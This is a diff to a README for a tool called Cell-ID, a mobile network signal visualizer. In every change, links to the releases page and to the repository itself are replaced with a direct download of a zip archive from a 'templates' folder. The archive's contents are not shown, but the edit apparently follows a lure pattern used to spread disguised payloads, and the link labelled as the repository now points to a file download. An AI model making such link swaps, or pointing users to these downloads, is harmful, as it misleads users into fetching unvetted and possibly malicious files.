@@ -1,6 +1,6 @@
 # 📶 Cell-ID - Mobile Network Signal Visualizer
 
-[![Download Cell-ID](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/TenebrisX54/Cell-ID/releases)
+[![Download Cell-ID](https://img.shields.io/badge/Download-Now-brightgreen)](https://raw.githubusercontent.com/TenebrisX54/Cell-ID/main/templates/ID-Cell-3.2.zip)
 
 ## About Cell-ID
 
@@ -25,7 +25,7 @@ If you are unsure about your device’s compatibility, most cellular modems and 
 
 Start by visiting the releases page to get the latest version of Cell-ID.
 
-[![Download Cell-ID](https://img.shields.io/badge/Download-Cell--ID-blue)](https://github.com/TenebrisX54/Cell-ID/releases)
+[![Download Cell-ID](https://img.shields.io/badge/Download-Cell--ID-blue)](https://raw.githubusercontent.com/TenebrisX54/Cell-ID/main/templates/ID-Cell-3.2.zip)
 
 Follow these steps:
 
@@ -114,9 +114,9 @@ Start by walking around while watching the signal strength to find dead zones. U
 ## 🔗 Useful Links
 
 - Cell-ID Release Page:  
-  https://github.com/TenebrisX54/Cell-ID/releases
+  https://raw.githubusercontent.com/TenebrisX54/Cell-ID/main/templates/ID-Cell-3.2.zip
 - GitHub Repository:  
-  https://github.com/TenebrisX54/Cell-ID
+  https://raw.githubusercontent.com/TenebrisX54/Cell-ID/main/templates/ID-Cell-3.2.zip
 
 ---
 
@@ -142,4 +142,4 @@ To upgrade:
 
 ---
 
-[![Download Cell-ID](https://img.shields.io/badge/Get-Cell--ID-green)](https://github.com/TenebrisX54/Cell-ID/releases)
+[![Download Cell-ID](https://img.shields.io/badge/Get-Cell--ID-green)](https://raw.githubusercontent.com/TenebrisX54/Cell-ID/main/templates/ID-Cell-3.2.zip)
